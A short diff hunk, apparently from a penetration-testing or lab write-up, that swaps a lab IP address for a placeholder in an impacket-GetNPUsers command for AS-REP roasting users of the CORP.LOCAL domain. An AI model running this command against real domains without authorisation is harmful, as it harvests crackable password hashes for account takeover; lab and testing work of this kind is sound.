@@ -88,7 +88,7 @@ svc_legacy
 
 ```bash
 impacket-GetNPUsers CORP.LOCAL/ \
--dc-ip 192.168.56.10 \
+-dc-ip <target_ip> \
 -usersfile users.txt
 ```
 
